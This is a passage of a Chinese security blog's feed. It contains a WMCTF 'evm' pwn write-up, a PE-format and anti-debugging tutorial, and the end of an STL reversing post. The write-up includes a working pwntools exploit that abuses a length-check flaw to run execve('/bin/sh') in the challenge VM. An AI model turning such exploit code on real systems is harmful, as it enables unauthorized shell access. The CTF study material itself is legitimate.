vmc&#123;cefe4cd4-04e8-473a-d403-c0f9c0cef484&#125;</span><br></pre></td></tr></table></figure><h1>总结</h1><p>函数还是太简单了，只要分析一个STL的数据结构就行，没有控制流的难度很多功能太好猜，扣符号真的恶心。感觉可以改改之后放l3h招新（纯粹数据结构还原）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;什么是STL?&lt;/h1&gt;
&lt;p&gt;STL(Standard Template Library)是C++库为我们实现好的一系列数据结构和方法，是一些常用结构的标准实现。他们的数据结构都被定义好了，在编程的时候可以直接调用。&lt;/p&gt;
&lt;p&gt;那么对于逆向来说，我们主要是要识别出对</summary>
      
    
    
    
    <category term="Reverse" scheme="http://example.com/categories/Reverse/"/>
    
    
    <category term="逆向" scheme="http://example.com/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF2023evm非预期</title>
    <link href="http://example.com/2024/09/16/WMCTF2024evm%E9%9D%9E%E9%A2%84%E6%9C%9F/"/>
    <id>http://example.com/2024/09/16/WMCTF2024evm%E9%9D%9E%E9%A2%84%E6%9C%9F/</id>
    <published>2024-09-16T03:44:31.000Z</published>
    <updated>2024-09-16T08:09:01.850Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。</p><p>主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改risc才回来重新看的。</p><p>虚拟机vm在主函数栈上声明，是一个__int64数组，大小37，前4个用于存放初始化的内存地址，后面32个是通用寄存器，结合指令推进函数最后一个是PC寄存器。因此复原结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x128</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: main/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">void</span> *page_table0;</span><br><span class="line"><span class="number">00000008</span>     <span class="type">void</span> *page_table1;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">void</span> *mem3;</span><br><span class="line"><span class="number">00000018</span>     <span class="type">void</span> *mem4;</span><br><span class="line"><span class="number">00000020</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000120</span>     __int64 pc;</span><br><span class="line"><span class="number">00000128</span> &#125;;</span><br></pre></td></tr></table></figure><p>实在是不想人工看了，指令解析没有再细看，反正是个RISC32，4字节长度实现了一些运算，访存和一小部分的跳转分支指令。</p><h1>关键点</h1><p>这里虚拟机运行函数相当于是开了两个进程（就是复制粘贴两个一模一样的，前后两部分代码只有一个参数flag 0 和 1的区别），跟进这个可疑的flag发现，这个标志位参数在这个函数里被调用，对应了两个不同的页：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">calc_page_addr</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> vm *vm,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 va,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int8 select_table,</span></span><br><span class="line"><span class="params">        __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 page_num; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">if</span> ( va &gt; <span class="number">0x1FFFFF</span> )</span><br><span class="line">    _Exit(<span class="number">1</span>);</span><br><span class="line">  page_num = *(_QWORD *)(*((_QWORD *)&amp;vm-&gt;page_table0 + select_table) + <span class="number">8</span> * (va &gt;&gt; <span class="number">12</span>));</span><br><span class="line">  <span class="keyword">if</span> ( (a4 &amp; page_num) == <span class="number">0</span> )</span><br><span class="line">    _Exit(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (page_num &amp; <span class="number">8</span>) == <span class="number">0</span> )</span><br><span class="line">    _Exit(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">return</span> page_num &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL | va &amp; <span class="number">0xFFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细观察可以发现两个地址的操作没有任何不同，唯一的不同在于，在解析指令的时候，syscall需要flag为1才能触发，另一个进程不执行syscall。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)opcode == <span class="number">0x73</span> ) <span class="comment">// syscall &lt;-we need to be here</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    <span class="keyword">return</span> syscall(vm-&gt;regs[<span class="number">10</span>], vm-&gt;regs[<span class="number">11</span>], vm-&gt;regs[<span class="number">12</span>], vm-&gt;regs[<span class="number">13</span>], vm-&gt;regs[<span class="number">14</span>], vm-&gt;regs[<span class="number">15</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是对于flag为1的那部分指令存储，这里只允许全是0x13：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> read(<span class="number">0</span>, buf, buf_size);  <span class="comment">// second input using page1</span></span><br><span class="line"><span class="comment">// 只有page1能触发syscall</span></span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)buf_size &gt;&gt; <span class="number">2</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( *((_DWORD *)buf + i) != <span class="number">0x13</span> )</span><br><span class="line">     _Exit(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>那我们就要想办法执行syscall</p><h1>预期解</h1><p>预期解是将指令解析逆出来了，发现有一种store不经过我们calc_pageaddr的虚拟地址页表转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x2C</span>:</span><br><span class="line">  v16 = vm-&gt;regs[(instruct &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x1F</span>]</span><br><span class="line">      + (((<span class="type">unsigned</span> __int16)instruct &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x1F</span>)</span><br><span class="line">      + <span class="number">32</span> * (HIBYTE(instruct) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  v18 = vm-&gt;regs[(HIWORD(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  v21 = (__int64 *)((<span class="type">char</span> *)vm-&gt;mem3 + v16);<span class="comment">// 硬编码</span></span><br><span class="line">  <span class="keyword">if</span> ( v16 &gt; <span class="number">0x1FFFFF</span> )</span><br><span class="line">    _Exit(<span class="number">1</span>);</span><br><span class="line">  opcode = (BYTE1(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)opcode == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    opcode = (__int64)vm-&gt;mem3 + v16;</span><br><span class="line">    *v21 = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ((BYTE1(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7u</span>) &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)opcode == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opcode = (__int64)vm-&gt;mem3 + v16;</span><br><span class="line">      *(_DWORD *)v21 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opcode = (__int64)vm-&gt;mem3 + v16;</span><br><span class="line">      <span class="keyword">if</span> ( ((BYTE1(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_WORD *)v21 = v18;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)v21 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>预期解是，利用页表0能执行的除了syscall的所有指令控制好寄存器，利用这个立即数写入地址不经过转换的漏洞在页表1写入能够执行的syscall指令，填上0x13绕过检查后执行后面的syscall。题目中在数据段为我们留好了&quot;/bin/sh&quot;字符串，而且也没开aslr，直接拿就行。</p><h1>非预期</h1><p>观察上面的循环0x13检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)buf_size &gt;&gt; <span class="number">2</span>; ++i )</span><br></pre></td></tr></table></figure><p>出题人应该本来想限制i循环次数在bufsize/4以内的，但是这里用了个右移2位的操作（可能是编译器优化或者什么），也就是说，如果buf_size只有2位，这个检查就不会生效了。我们为bufsize输入3，直接就能写入3个字节的code，这里就直接写入syscall就行了。</p><h1>exp：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./evm&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./evm&#x27;</span>)</span><br><span class="line">binsh=<span class="number">0x4050a0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addi</span>(<span class="params">rd, rs1, imm</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((imm &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b000</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slli</span>(<span class="params">rd, rs1, imm</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((imm &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b001</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg_xor</span>(<span class="params">rd, rs1, rs2</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((<span class="number">0</span> &lt;&lt; <span class="number">25</span>) | (rs2 &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b100</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x33</span>)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    reg_xor(<span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">    + reg_xor(<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line">    + reg_xor(<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>)</span><br><span class="line">    + reg_xor(<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>)</span><br><span class="line">    + addi(<span class="number">10</span>, <span class="number">10</span>, <span class="number">0x3B</span>)</span><br><span class="line">    + addi(<span class="number">11</span>, <span class="number">11</span>, <span class="number">0x405</span>)</span><br><span class="line">    + slli(<span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">    + addi(<span class="number">11</span>, <span class="number">11</span>, <span class="number">0xA0</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;standard&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>.encode())<span class="comment"># lenth of code</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)<span class="comment">#page0 code here</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)<span class="comment"># bufsize</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x73\x00\x00&#x27;</span>)<span class="comment"># page1 code（BYPASS!!!)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。&lt;/p&gt;
&lt;p&gt;主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改ri</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="vm" scheme="http://example.com/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>Windows下的简单逆向分析入门——从PE开始</title>
    <link href="http://example.com/2024/09/11/Windows%E4%B8%8B%E7%9A%84%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/09/11/Windows%E4%B8%8B%E7%9A%84%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2024-09-11T01:06:47.000Z</published>
    <updated>2024-09-20T01:05:06.776Z</updated>
    
    <content type="html"><![CDATA[<h1>PE 文件格式简析</h1><p>相比于ELF，PE文件中包含了相当多的可读性非常强（更加直观）的信息。包括预设的程序加载基址0x400000, 导入导出表等等都是直接写明文字符串而且独立于section之外单独存储的。用010editor结合一个exe程序简单分析一下。这里记得分清FOA和RVA的转换与记录区别，windows下的PE文件不区分内存和文件视图，而是用两种不同的地址来进行标识。和linux还是有一点差别的。</p><h2 id="PE文件头">PE文件头</h2><h3 id="一个没什么用的DOS头">一个没什么用的DOS头</h3><p>以5a4d开头，记录了一些DOS16位模式运行需要的信息，兼容的问题保留了。最后一个字段AddressOfNewExeHeader指向PE头（NtHeader）的FOA地址。</p><h3 id="NtHeader">NtHeader</h3><p>以0x4550（PE）开头。记录了很多关键信息，分为文件头FileHeader和可选头OptionalHeader。</p><h4 id="FileHeader">FileHeader</h4><p>记录运行架构，创建时间戳，符号表指针，optionalheader的大小，seciton数目和一个程序相关的属性flag字。包括是否32位等等信息，flag bit形式保存。<br><img src="/images/FileHeader.png" alt="FileHeader"></p><h4 id="OptionalHeader">OptionalHeader</h4><p>magic字段，然后一堆记录了各种东西的主版本号和最低版本号的字段，包括子系统，操作系统等等，略过。还有很多别的对齐信息，checksum，预留栈空间、dll属性flag等等乱七八糟的东西。</p><p>重点是这里记录了imagebase（内存镜像基地址，一般exe的都是0x400000），入口点rva地址，以及一个datadir结构体数组指向各个section的RVA地址。<img src="/images/OptionalHeader.png" alt="OptionalHeader"><br>这个datadir数组里面的成员只有一个地址和一个大小，没有对应节就置空。寻址对应节的方法是，这个数组里面都是按顺序排好的，下标0（第一个）存放export，第二个存放import等等，获取的时候用宏就行，按顺序寻址因此不用别的连接方法。</p><h2 id="导入表和导出表">导入表和导出表</h2><p>import代表程序要导入哪些外部函数，export则代表要向外提供哪些函数。一般一个dll的导出表会比较多，而exe一般没有导出表（空）。</p><blockquote><p>值得一提的是，我们其实不需要导入表也能在程序运行的时候导入动态库，使用对应的api动态的进行装载即可。这一点在加壳保护等等会有点用</p></blockquote><h3 id="INT和IAT">INT和IAT</h3><p>IAT(Import Address Table)和INT(Import Name Table)这俩玩意在加载前是类似的，都是引入函数的信息。对于INT，其是<code>IMAGE_IMPORT_BY_NAME</code>的结构数组，里面就放函数名和函数序号。这个表即使在程序加载入内存后也不变化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;       <span class="comment">//可能为0，编译器决定，如果不为0，是函数在导出表中的索引</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];    <span class="comment">//函数名称，以0结尾，由于不知道到底多长，所以干脆只给出第一个字符，找到0结束</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>而对于IAT，其是<code>IMAGE_THUNK_DATA32</code>的结构数组，他是一个4字节联合体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">//RVA 指向_IMAGE_IMPORT_BY_NAME </span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>这个结构决定了函数可以索引名字也可以索引序号。如果最高位为0，则这里存放对应INT的RVA，如果最高位为1，则直接用31位索引导出序号。程序加载后，IAT就会更换为函数的地址信息。</p><h3 id="导入表Import">导入表Import</h3><blockquote><p>有点复杂，感觉不如linux的got和plt<br>首先，对于每个库，都有一个<code>IMAGE_IMPORT_DESCRIPTOR</code>的结构进行维护，导入表存放的是<code>IMAGE_IMPORT_DESCRIPTOR</code>数组，一个库在导入表中占一个条目。</p></blockquote><p>导入表的descriptor结构体只是一个引导，还没有到函数地址。它维护dll的名字（也是RVA），时间戳，ForwarderChain标志（可以不管）以及比较关键的两个指针：指向INT RVA的OriginalFirstThunk和指向IAT RVA的FirstChunk。<br><img src="/images/ImportTable.png" alt="ImportTable"></p><h3 id="导出表">导出表</h3><p>导出表就可以说的比较简单，它维护一个<code>IMAGE_EXPORT_DIRECTORY</code>数组，每个条目里面保存了时间戳、版本号、模块名的RVA、api基数（从1开始），函数的数目，函数名数目（很多函数没有名字），以及导出地址表、导出名称表、导出序列号的rva。</p><h2 id="重定位表">重定位表</h2><blockquote><p>参考<a href="https://www.cnblogs.com/Chary/p/12981261.html">https://www.cnblogs.com/Chary/p/12981261.html</a><br>linux的地址在链接过程中就已经将符号全部重定位好了，而且全部都是偏移地址，base在装载的时候再说。而windows我们知道pe头中每个imagebase绝对地址都是写死的而且dll大概率都一样，偏移也写死的话那地址冲突怎么办？那就需要重定位表。他本质存放的是一堆需要修改的代码地址。感觉不如linux的延迟绑定但是似乎是更直观的解法。为了节约，重定位表是按页记录重定位的信息的。每个条目管1000字节的程序，就两个字段（有用），第一个字段指向要重定位的RVA（0x1000 page align），第二个字段sizeofblock则是记录重定位块的大小，后面跟的都是具体偏移什么的。</p></blockquote><h2 id="TLS表">TLS表</h2><h3 id="什么是TLS">什么是TLS</h3><p>TLS全程是Thread Local Storage，即线程局部存储，它关联到具体的线程而非进程。顾名思义，它是为了实现相同进程下不同线程间互相独立的地址空间而存在的，总之它能为线程提供一个拥有全局变量或者静态数据的视图，但其实是副本这种感觉。简单来讲它的实现，它为每个线程分配了一个单独的数组，然后根据索引去查找数组的值。对于不同的线程，索引一样但实际地址不同值也不同。</p><blockquote><p>TLS回调函数在main函数之前就会运行，会阻截调试。这是反调试的一个关键。参见反调试技术。</p></blockquote><h3 id="TLS表-2">TLS表</h3><p>在windows下，TLS的使用分为动态和静态两种。动态使用指的是通过<code>tlsalloc</code>，<code>tlssetvalue</code>等动态函数，在程序运行期间对tls相关的结构和空间进行初始化，而静态使用则会为pe文件生成tls表。</p><p>tls表会保存通过tls访问的数据的初始化其实地址和结束地址，范围里存储程序中tls所使用的全局变量的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> &#123;</span></span><br><span class="line">    DWORD   StartAddressOfRawData;<span class="comment">//TLS初始化数据的起始地址</span></span><br><span class="line">    DWORD   EndAddressOfRawData;　<span class="comment">//TLS初始化数据的结束地址  两个正好定位一个范围,范围放初始化的值</span></span><br><span class="line">    DWORD   AddressOfIndex;      <span class="comment">// TLS 索引的位置</span></span><br><span class="line">    DWORD   AddressOfCallBacks;  <span class="comment">//  Tls回调函数的数组指针</span></span><br><span class="line">    DWORD   SizeOfZeroFill;　　<span class="comment">//填充0的个数</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics;　<span class="comment">//保留</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD Reserved0 : <span class="number">20</span>;</span><br><span class="line">            DWORD Alignment : <span class="number">4</span>;</span><br><span class="line">            DWORD Reserved1 : <span class="number">8</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure><p>多的不讲了，反调试细说。</p><h2 id="延迟导入表">延迟导入表</h2><p>加速加载速度用，这个descriptor结构体每个存储了属性，以及指向dll名字，iat，int和一堆东西的rva。这玩意可以延迟导入不常用的dll函数，类似于linux下的延迟绑定，一次绑定后IAT就被写好后面就不用再绑了。</p><p>这个功能需要编译的时候手动开启然后自己制定延迟导入的dll名称。虽然条目也是按dll写，延迟导入是一次一个函数的。<br><img src="/images/DelayLoad.png" alt="Delay loader"></p><h2 id="资源和其他表">资源和其他表</h2><p>windows将位图，鼠标指针，各种消息等等都作为资源存储。也是用表存储，这里不再多说，看不下去了没啥意思。</p><h1>PE的装载和内存视图</h1><h1>反调试技术</h1><h2 id="TLS反调试">TLS反调试</h2><blockquote><p>参考<a href="https://blog.csdn.net/Joyce_hjll/article/details/136732526">https://blog.csdn.net/Joyce_hjll/article/details/136732526</a><br>我们知道，自己注册的tls函数会在主线程调用main之前就调用，回调函数触发的时机总共有下面几个：</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>主线程调用main之前</p></li><li class="lvl-2"><p>子线程启动前</p></li><li class="lvl-2"><p>子线程结束后</p></li><li class="lvl-2"><p>主线程结束后一般是用主线程调用main前启动回调函数来阻截调试让程序退出，需要patch。</p></li></ul><h1>入口点识别</h1><h2 id="一般的main函数">一般的main函数</h2><p>32位下从入口开始寻找3个push一个call的函数（三个参数）。release版本主函数一般就在地址开始附近，拉到顶就行了。</p><h1>WMCTF2024 Ezlearn</h1><p>第一次看windows的简单逆向分析。程序也是用了自定义section代码数据共存，函数调用直接jmp混淆call reference分析等等的神秘方法。介绍下几个关键点。</p><h2 id="破坏堆栈平衡的花指令">破坏堆栈平衡的花指令</h2><p>刚开始不懂，IDA报错sp分析失败，跟进看一下发现是程序采用了这么一套代码来进行反汇编混淆：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">call $+5</span><br><span class="line">pop ebp</span><br><span class="line">dec eax ; useless</span><br><span class="line">add ebp (offset a-offset b) ; 就是8</span><br><span class="line">push ebp</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">..next code</span><br></pre></td></tr></table></figure><p>这样一套流程下来，其实就是代码顺序往下执行，利用call和$符号将代码地址压栈，pop之后借助ebp的push+ret再恢复控制流。但是堆栈的分析就会被破坏。这样的指令有很多，把这种花指令要全nop掉就能反汇编了。</p><h2 id="TLS反调试函数">TLS反调试函数</h2><p>直接用ida动调的时候一开就会退出，用x64dbg看了一眼退出前的最后一个call，发现指向这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">001</span>A10FF</span><br><span class="line">.text:<span class="number">001</span>A10FF                     public TlsCallback_0</span><br><span class="line">.text:<span class="number">001</span>A10FF     TlsCallback_0   proc near               ; DATA XREF: .rdata:TlsCallbacks↓o</span><br><span class="line">.text:<span class="number">001</span>A10FF <span class="number">000</span>                 jmp     TlsCallback_0_0</span><br><span class="line">.text:<span class="number">001</span>A10FF     TlsCallback_0   endp</span><br></pre></td></tr></table></figure><p>跟进发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TlsCallback_0_0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  BOOL pbDebuggerPresent; <span class="comment">// [esp+DCh] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  pbDebuggerPresent = <span 